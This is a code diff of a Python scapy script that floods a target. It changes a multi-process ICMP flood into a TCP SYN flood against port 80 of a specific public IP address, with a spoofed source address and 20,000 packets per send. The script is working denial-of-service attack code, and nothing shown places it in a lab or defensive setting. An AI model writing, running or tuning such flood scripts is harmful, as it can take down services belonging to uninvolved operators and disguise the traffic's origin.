@@ -5,16 +5,16 @@ from scapy.all import *
 from queue import Queue
 import multiprocessing
 import os
-no_of_process = 5
+no_of_process = 12
 q = Queue()
 
 def launch():
-    p = (IP(src="35.225.200.175", dst="35.193.17.254") / ICMP())
+    p = (IP(src="35.225.200.175", dst="144.217.100.106") / TCP(dport=80,flags="S"))
     send(p, count=20000)
 
 
-NUMBER_OF_WORKERS = 10
-NUMBER_OF_JOBS = 10
+NUMBER_OF_WORKERS = 5
+NUMBER_OF_JOBS = 5
 total_process = []
 
 
